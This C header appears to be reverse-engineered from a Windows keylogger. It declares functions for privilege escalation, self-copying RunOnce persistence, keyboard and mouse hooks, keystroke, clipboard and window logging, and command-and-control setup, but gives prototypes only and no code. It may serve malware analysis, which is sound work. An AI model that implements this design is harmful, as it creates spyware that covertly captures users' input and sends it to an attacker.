#pragma once
#include <windows.h>
using namespace Gdiplus;

int EscalatePrivileges(const char* PrivilegeName);
int PersistRunOnce_DropSelf(void);
int CompareSelfPathToTargetPath(void);
int RetriveCmdlineArgs(void);

void ExecuteTargetPath_NoArg(const wchar_t * intendedFullPath);

HANDLE MutexOperations(const wchar_t* MutexName);

int StartSocket(void);

Status StartGDI(void);
void InitCriticalSections();
int LogKeystroke(const wchar_t* key);
int LogWindowTimeStamp(wchar_t* currentWindowName);
int HandleRegularKey(KBDLLHOOKSTRUCT* hook_struct, int bCapsFound);
HHOOK InstallKeyboardHook();
void InstallMouseHook();
void GetC2Info();
BOOL InitKeylogOps();
BOOL InitClipboardOps();
void SetupKeylogFolder();

int NumArgOperation(int NumArgs);

int ThreadOperations(int arg1 , wchar_t* arg2, int PID);


int sub_45cb44(struct ThreadArgs* threadArgs); //POSSIBLE DEAD CODE
int sub_45c9ca(struct ThreadArgs *threadArgs);//POSSIBLE DEAD CODE
int CreateProcessWrapperWithPIDasArg(struct ThreadArgs* threadArgs); //POSSIBLE DEAD CODE
int sub_45caab(void); //POSSIBLE DEAD CODE
int sub_45cadf(struct ThreadArgs* threadArgs); //POSSIBLE DEAD CODE